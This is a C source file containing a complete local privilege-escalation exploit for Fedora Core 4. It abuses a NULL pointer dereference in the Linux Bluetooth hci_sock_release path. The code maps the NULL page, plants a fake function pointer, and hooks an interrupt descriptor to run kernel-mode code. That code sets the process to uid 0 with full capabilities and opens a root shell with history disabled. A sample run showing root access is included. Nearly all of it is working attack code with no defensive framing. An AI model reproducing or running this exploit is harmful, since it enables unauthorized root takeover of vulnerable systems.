/* Fedora Core release 4 local root exploit by Richard van Eeden (esdee@promisc.org) - 10-04-2006
   Kernel exploit for a NULL pointer dereference in "hci_sock_release" of the Bluetooth stack.
*/

/* 
   Example exploitation:

   [esdee@localhost ~]$ cat /etc/issue
   Fedora Core release 4 (Stentz)
   Kernel \r on an \m
   [esdee@localhost ~]$ gcc -o fl0p fedora-local-root.c -Wall -Werror -O3 && ./fl0p
   [!] Fedora Core release 4 - Local root exploit (esdee@promisc.org)
       (C)2006 Suresec.

    -  IDT base address   : 0xc041f000
    -  modify_idt_gate at : 0x08048810
    -  new IRQ handler at : 0x08048808

   [!] IRQ 0x69 modified!
   [!] uid/gid changed from 500/500 to 0/0.

   sh-3.00# id
   uid=0(root) gid=0(root) groups=500(esdee) context=user_u:system_r:unconfined_t
   sh-3.00#
*/

// Magic values.

#define HOOK_IRQ                        0x69
#define OFFSET                          0x240
#define RING                            0x3
#define MAGIC_UID                       0x69
#define _LINUX_CAPABILITY_VERSION       0x19980330
#define THREAD_SIZE                     4096
#define IRQ_MODIFIED                    0x11
#define IRQ_UNMODIFIED                  0x22

/*
#define DEBUG
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wait.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <linux/capability.h>

int capget(cap_user_header_t header, cap_user_data_t data);
int capset(cap_user_header_t header, const cap_user_data_t data);

int setresuid(uid_t ruid, uid_t euid, uid_t suid);
int setresgid(gid_t rgid, gid_t egid, gid_t sgid);

uid_t uid,euid;
gid_t gid,egid;

struct idtr idt;
struct descriptor *igd;

struct idtr {
        unsigned short limit;
        unsigned int base;
} __attribute__ ((packed));

struct descriptor {
        unsigned short off1;
        unsigned short sel;
        unsigned char none,flags;
        unsigned short off2;
} __attribute__ ((packed));

/* The new interrupt handler. It pushes a pointer to the task structure on the stack and calls modify_task.
** Executed with CPL 0.
*/

extern int kernel_code;
__asm__ (
        " kernel_code:             \n"
        " pusha;                   \n"
        " call modify_task;        \n"
        " popa;                    \n"
        " iret;                    \n");

/* We point the function pointer in hci_sock_release to this function. */

void
modify_idt_gate(void)
{
        /* Executed with CPL 0. This function modifies an interrupt gate descriptor. */

        unsigned char *ptr = (unsigned char *)idt.base + (8 * HOOK_IRQ);

        igd = (struct descriptor *)ptr;

        if (((igd->off2 << 16) | igd->off1) != (unsigned int)&kernel_code) {

                memset(igd, '\0', sizeof(struct descriptor));

                igd->off1       = (unsigned int)&kernel_code & 0xffff;
                igd->off2       = (unsigned int)&kernel_code >> 16;
                igd->flags      = 0x8E | (RING << 5);
                igd->none       = 0;
                igd->sel        = 0x0060;

                exit(IRQ_MODIFIED);
        }

        exit(IRQ_UNMODIFIED);
}

unsigned int *
current_thread_info(void)
{
        /* Returns a pointer to thread_info. */

        unsigned int *ti = NULL;

        __asm__("andl %%esp,%0; ":"=r" (ti) : "0" (~(THREAD_SIZE - 1)));

        return ti;
}

unsigned int *
get_current(void)
{
        /* Returns current_thread_info->task. */

        unsigned int *thread_info = current_thread_info();

        if (!thread_info) {

                #if defined(DEBUG)
                fprintf(stdout, "[!] CPL0 execution: invalid thread_info pointer!\r\n");
                #endif

                exit(EXIT_FAILURE);
        }

        #if defined(DEBUG)
        fprintf(stdout, "[!] CPL0 execution: thread_info: 0x%08x\r\n", thread_info);
        #endif

        return (unsigned int *)*thread_info;
}

void
modify_task(void)
{
        /* Executed with CPL 0. This function grabs the current task structure and will search and replace the
        ** current uid/gid. This function shouldn't use anything that could sleep. (No write/read stuff)
        */

        static struct __user_cap_header_struct  cap_head;
        static struct __user_cap_data_struct    cap_data_new;

        unsigned int i                  = 0;
        unsigned int found              = 0;

        unsigned int *task_struct       = get_current();

        #if defined(DEBUG)
        fprintf(stdout, "[!] CPL0 execution: task: 0x%08x\r\n", task_struct);
        #endif

        if (!task_struct) {

                #if defined(DEBUG)
                fprintf(stdout, "[!] CPL0 execution: invalid task_struct pointer!\r\n");
                #endif

                exit(EXIT_FAILURE);
        }

        for(i = 0; i <= 4095; i++, task_struct++) {

                if (    (task_struct[0] == uid) && (task_struct[1] == euid) &&
                        (task_struct[4] == gid) && (task_struct[5] == egid)) {

                        task_struct[0] = MAGIC_UID;

                        if (getuid() == MAGIC_UID) {

                                /* Set uid/gid. */

                                task_struct[0] = 0;             // uid

                                /* Set capabilities. */

                                task_struct[11] = -1;           // permitted

                                found = 1;

                                break;
                        } else {

                                /* Eek... We've modified a wrong value! */

                                task_struct[0] = uid;
                        }
                }
        }

        if (!found) {

                #if defined(DEBUG)
                fprintf(stdout, "[!] WARNING: uid/euid/gid/egid not found in task structure!\r\n");
                #endif

                exit(EXIT_FAILURE);
        }

        setresuid(0, 0, 0);
        setresgid(0, 0, 0);

        cap_head.version                = _LINUX_CAPABILITY_VERSION;
        cap_head.pid                    = 0;

        cap_data_new.effective          = -1;
        cap_data_new.permitted          = -1;
        cap_data_new.inheritable        = -1;

        if (capset(&cap_head, &cap_data_new) < 0) {

                #if defined(DEBUG)
                perror("capset");
                #endif

        }

        if (capget(&cap_head, &cap_data_new) < 0) {

                #if defined(DEBUG)
                perror("capget");
                #endif
        }

        #if defined(DEBUG)
        if (  (cap_data_new.effective == -1) &&
              (cap_data_new.permitted == -1) &&
              (cap_data_new.inheritable == -1)) {

                fprintf(stdout, "[!] Capabilities changed!\r\n\r\n");
        }
        #endif

        return;
}

void
mmap_null(void)
{
        /* This function uses the sys_mmap syscall to map NULL (0x00000000) */

        unsigned int page_size = getpagesize();

        if (    mmap(   NULL,
                        page_size,
                        PROT_READ|PROT_WRITE|PROT_EXEC,
                        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,
                        -1,
                        0       ) != (void *)NULL) {

                fprintf(stderr, "mmap_null: Unable to map NULL page.\r\n");
                exit(EXIT_FAILURE);
        }

        return;
}

void
bluez_trigger_null_deref(void)
{
        int fd = 0;

        if ((fd = socket(AF_BLUETOOTH, SOCK_RAW, 1)) < 0) {
                perror("socket");
                exit(EXIT_FAILURE);
        }

        /* sys_accept() will call hci_sock_release with a NULL socket. */

        accept(fd, (void *)0xbade5dee,(void *)0xbade5dee);

        return;
}

unsigned int
mem_mmap(void)
{
        /* Little mmap() wrapper. */

        unsigned int page_size  = getpagesize();
        unsigned int ret        = 0;

        if ((ret = (unsigned int) mmap( NULL, page_size,
                                        PROT_READ|PROT_WRITE|PROT_EXEC,
                                        MAP_PRIVATE|MAP_ANONYMOUS,
                                        -1, 0)) == (unsigned int)MAP_FAILED) {

                perror("mmap");
                exit(EXIT_FAILURE);
        }

        return ret;
}

void
prepare_page(unsigned int address)
{
        unsigned int refcount   = 1;
        unsigned int page1      = mem_mmap();
        unsigned int page_size  = getpagesize();
        unsigned int i          = 0;

        /* The 0x1d4 offset should work, but the socket structure may differ between kernel versions. */

        for (i = 0; i < page_size; i += 4)
                memcpy((void *)0 + i, &page1, 4);

        /* The two refcounters should be set to 1. They're on offset 0x20 and 0x210.
        ** We just will fill the half of the page to make sure.
        **/

        for (i = 0; i < OFFSET; i += 4)
                memcpy((void *)page1 + i, &refcount, 4);

        /* The function pointer. */

        for (i = OFFSET; i < page_size; i += 4)
                memcpy((void *)page1 + i, &address, 4);

        return;
}

void
open_shell(void)
{
        char *envp[] = {        "TERM=vt100",
                                "SHELL=/bin/sh",
                                "HISTFILE=/dev/null",
                                "HISTFILESIZE=0",
                                "HISTSIZE=1000",
                                "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:",
                                NULL };

        char *argv[] = {        "/bin/sh",
                                NULL };

        execve(argv[0], argv, envp);
        _exit(EXIT_FAILURE);
}

void
bail_out(const char *description)
{
        fprintf(stdout, "[!] Exploit failed: %s\r\n", description);
        exit(EXIT_FAILURE);
}

int
main(void)
{
        pid_t pid       = 0;

        int status      = 0;


        fprintf(stdout, "[!] Fedora Core release 4 - Local root exploit (esdee@promisc.org)\r\n"
                        "    (C)2006 Suresec.\r\n\r\n");

        uid = getuid(); euid = geteuid();
        gid = getgid(); egid = getegid();

        __asm__ ("sidt %0" : "=m" (idt));

        fprintf(stdout, " -  IDT base address   : 0x%08x\r\n"
                        " -  modify_idt_gate at : 0x%08x\r\n"
                        " -  new IRQ handler at : 0x%08x\r\n\r\n",
                        idt.base, (unsigned int) &modify_idt_gate, (unsigned int)&kernel_code);

        switch(pid = fork()) {
                case 0:
                        mmap_null();
                        prepare_page((unsigned int)&modify_idt_gate);
                        bluez_trigger_null_deref();

                        break;
                case -1:
                        perror("fork");
                        exit(EXIT_FAILURE);
                default:

                        break;
        }

        wait(&status);

        if (WSTOPSIG(status) == SIGSEGV) bail_out("Child has segfaulted");

        switch(WEXITSTATUS(status)) {

                case IRQ_MODIFIED:
                        fprintf(stdout, "[!] IRQ 0x%02x modified!\r\n", HOOK_IRQ);
                        break;

                case IRQ_UNMODIFIED:
                        fprintf(stdout, "[!] IRQ 0x%02x is already modified!\r\n", HOOK_IRQ);
                        break;

                default:
                        bail_out("Invalid exit status");
        }

        __asm__ ("int $0x69");

        if ((getuid() != uid) && (getgid() != gid)) {
                fprintf(stdout, "[!] uid/gid changed from %u/%u to %u/%u.\r\n\r\n", uid, gid, getuid(), getgid());
                open_shell();
                return 0;
        }

        bail_out("uid/gid did not change!");

        return -1;
}

